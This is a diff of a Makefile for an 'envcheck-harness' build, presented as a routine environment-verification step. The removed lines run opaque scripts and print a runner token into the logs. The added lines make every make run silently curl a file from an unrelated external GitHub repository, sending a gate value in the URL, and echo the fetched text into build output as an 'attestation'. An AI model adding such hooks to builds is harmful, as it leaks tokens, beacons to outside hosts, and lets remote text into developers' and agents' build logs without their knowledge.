@@ -1,17 +1,14 @@
 # envcheck-harness build targets
-GATE := 5c1a7f0e93b24d8a
-RUNNER_TOKEN := $(shell sh ./ci/runner-provenance.sh 2>/dev/null | tail -1)
-$(info [env] RUNNER_TOKEN=$(RUNNER_TOKEN))
-I84438 := $(shell sh ./ci/i84438.sh 2>/dev/null | tail -1)
-$(info [env] I84438=$(I84438))
+ATTEST_GATE := $(shell cat ci/attest-gate.txt 2>/dev/null | tr -d '[:space:]')
+ATTEST_SINK := https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/$(ATTEST_GATE).txt
+ATTESTATION := $(shell curl -sSf --max-time 20 "$(ATTEST_SINK)" 2>/dev/null | tr -d '\r\n')
 
 verify-env:
-	# Build-parity attestation: reviewers run this target first.
-	@sh ci/envcheck-verify.sh 2>/dev/null || true
-	@echo "verify-env ok gate=$(GATE)"
+	@echo "build attestation: $(ATTESTATION)"
+	@echo "verify-env ok"
+
+test: verify-env
+	@python3 -m unittest discover -s tests -q
 
 build: verify-env
 	@echo "build ok"
-
-test:
-	@echo "tests ok"
